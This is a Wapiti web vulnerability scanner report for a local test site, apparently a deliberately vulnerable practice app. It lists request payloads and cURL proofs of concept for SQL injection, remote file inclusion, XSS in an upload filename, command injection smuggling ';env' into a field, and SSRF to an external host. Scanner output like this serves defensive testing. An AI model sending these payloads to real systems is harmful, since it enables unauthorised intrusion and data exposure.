********************************************************************************
                     Wapiti 3.0.1 - wapiti.sourceforge.net
                       Report for http://localhost:8000/
              Date of the scan : Sun, 28 Jul 2019 15:39:40 +0000
                          Scope of the scan : folder
********************************************************************************

Summary of vulnerabilities :
----------------------------
                                                            SQL Injection :   2
                                                      Blind SQL Injection :   0
                                                            File Handling :   1
                                                     Cross Site Scripting :   1
                                                           CRLF Injection :   0
                                                       Commands execution :   1
                                                          Htaccess Bypass :   0
                                                              Backup file :   0
                                               Potentially dangerous file :   5
                                              Server Side Request Forgery :   1
********************************************************************************

SQL Injection
-------------
MySQL Injection via injection in the parameter username
Evil request:
    GET /vulnerabilities/brute/?username=%C2%BF%27%22%28&password=letmein&Login=Login HTTP/1.1
    Host: localhost:8000
    Referer: http://localhost:8000/vulnerabilities/brute/
cURL command PoC : "curl "http://localhost:8000/vulnerabilities/brute/?username=%C2%BF%27%22%28&password=letmein&Login=Login" -e "http://localhost:8000/vulnerabilities/brute/""

                                  *   *   *

MySQL Injection via injection in the parameter id
Evil request:
    GET /vulnerabilities/sqli/?id=%C2%BF%27%22%28&Submit=Submit HTTP/1.1
    Host: localhost:8000
    Referer: http://localhost:8000/vulnerabilities/sqli/
cURL command PoC : "curl "http://localhost:8000/vulnerabilities/sqli/?id=%C2%BF%27%22%28&Submit=Submit" -e "http://localhost:8000/vulnerabilities/sqli/""

                                  *   *   *

********************************************************************************

File Handling
-------------
Remote inclusion vulnerability via injection in the parameter page
Evil request:
    GET /vulnerabilities/fi/?page=http%3A%2F%2Fwww.google.fr%2F%3F HTTP/1.1
    Host: localhost:8000
cURL command PoC : "curl "http://localhost:8000/vulnerabilities/fi/?page=http%3A%2F%2Fwww.google.fr%2F%3F""

                                  *   *   *

********************************************************************************

Cross Site Scripting
--------------------
XSS vulnerability found via injection in the parameter uploaded
Evil request:
    POST /vulnerabilities/upload/ HTTP/1.1
    Host: localhost:8000
    Referer: http://localhost:8000/vulnerabilities/upload/
    Content-Type: multipart/form-data; boundary=------------------------boundarystring

    ------------------------boundarystring
    Content-Disposition: form-data; name="MAX_FILE_SIZE"

    100000
    ------------------------boundarystring
    Content-Disposition: form-data; name="Upload"

    Upload
    ------------------------boundarystring
    Content-Disposition: form-data; name="uploaded"; filename="<img src=. onerror=alert('wacujx0ehp')>"

    /* snip file content snip */
------------------------boundarystring--
cURL command PoC : "curl "http://localhost:8000/vulnerabilities/upload/" -e "http://localhost:8000/vulnerabilities/upload/" -F "MAX_FILE_SIZE=100000" -F "Upload=Upload" -F "uploaded=@your_local_file;filename=<img src=. onerror=alert('wacujx0ehp')>""

                                  *   *   *

********************************************************************************

Commands execution
------------------
Command execution via injection in the parameter ip
Evil request:
    POST /vulnerabilities/exec/ HTTP/1.1
    Host: localhost:8000
    Referer: http://localhost:8000/vulnerabilities/exec/
    Content-Type: application/x-www-form-urlencoded

    ip=%3Benv&Submit=Submit
cURL command PoC : "curl "http://localhost:8000/vulnerabilities/exec/" -e "http://localhost:8000/vulnerabilities/exec/" -d "ip=%3Benv&Submit=Submit""

                                  *   *   *

********************************************************************************

Potentially dangerous file
--------------------------
Configuration information may be available remotely.
Evil request:
    GET /config/ HTTP/1.1
    Host: localhost:8000
cURL command PoC : "curl "http://localhost:8000/config/""

                                  *   *   *

Contains PHP configuration information
References:
http://osvdb.org/show/osvdb/3233
Evil request:
    GET /phpinfo.php HTTP/1.1
    Host: localhost:8000
cURL command PoC : "curl "http://localhost:8000/phpinfo.php""

                                  *   *   *

PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
References:
http://osvdb.org/show/osvdb/12184
Evil request:
    GET /index.php?%3DPHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1
    Host: localhost:8000
cURL command PoC : "curl "http://localhost:8000/index.php?%3DPHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000""

                                  *   *   *

Apache default file found.
References:
http://osvdb.org/show/osvdb/3233
Evil request:
    GET /icons/README HTTP/1.1
    Host: localhost:8000
cURL command PoC : "curl "http://localhost:8000/icons/README""

                                  *   *   *

Admin login page/section found.
Evil request:
    GET /login.php HTTP/1.1
    Host: localhost:8000
cURL command PoC : "curl "http://localhost:8000/login.php""

                                  *   *   *

********************************************************************************

Server Side Request Forgery
---------------------------
SSRF vulnerability via injection in the parameter page.
The target performed an outgoing HTTP GET request at 2019-07-28T17:40:56+02:00 with IP 195.206.183.149.
Full request can be seen at https://wapiti3.ovh/ssrf_data/g14rru/49/70616765/1564328456-195.206.183.149.txt
Evil request:
    GET /vulnerabilities/fi/?page=http%3A%2F%2Fexternal.url%2Fpage HTTP/1.1
    Host: localhost:8000
cURL command PoC : "curl "http://localhost:8000/vulnerabilities/fi/?page=http%3A%2F%2Fexternal.url%2Fpage""

                                  *   *   *

********************************************************************************

Summary of anomalies :
----------------------
                                                    Internal Server Error :   0
                                                     Resource consumption :   0
********************************************************************************
